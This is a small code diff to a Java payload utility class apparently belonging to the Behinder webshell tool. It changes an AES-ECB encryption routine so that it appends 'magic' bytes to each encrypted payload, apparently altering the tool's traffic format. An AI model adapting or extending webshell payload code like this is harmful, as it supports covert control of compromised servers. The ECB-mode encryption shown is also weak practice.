@@ -1,5 +1,6 @@
 package net.rebeyond.behinder.payload.java;
 
+import java.io.ByteArrayOutputStream;
 import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Iterator;
@@ -92,7 +93,10 @@ public class Utils {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      bos.write(this.getMagic());
+      return bos.toByteArray();
    }
 
    private String buildJson(Map entity, boolean encode) throws Exception {
